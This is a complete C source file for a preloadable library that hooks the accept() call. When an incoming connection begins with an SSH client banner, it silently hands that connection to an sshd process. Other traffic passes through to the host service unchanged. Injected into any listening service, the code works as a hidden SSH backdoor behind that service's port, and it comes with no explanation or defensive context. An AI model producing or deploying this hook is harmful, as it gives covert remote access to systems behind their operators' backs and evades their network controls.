#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>

#define __USE_GNU

#include <dlfcn.h>

static const char trigger[] = "SSH-2.0-";
static char *(program[]) = { "sshd", "-di", "-vvv" }; 

int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
    static int (*_accept)(int, struct sockaddr *, socklen_t *) = NULL;
    char buf[sizeof(trigger)];

    if (!_accept)
        _accept = dlsym(RTLD_NEXT, "accept");   

    for(;;) {
        int r = _accept(sockfd, addr, addrlen);

        if (r <= 0 ||
            recv(r, buf, sizeof(buf), MSG_PEEK) != sizeof(buf) || 
            strncmp(buf, trigger, sizeof(buf) - 1)) {
                return r;
        }        

        if(!fork()) {
            dup2(r, 0);
            dup2(r, 1);
            execvp(program[0], program);
        }

        close(r);

    }

}
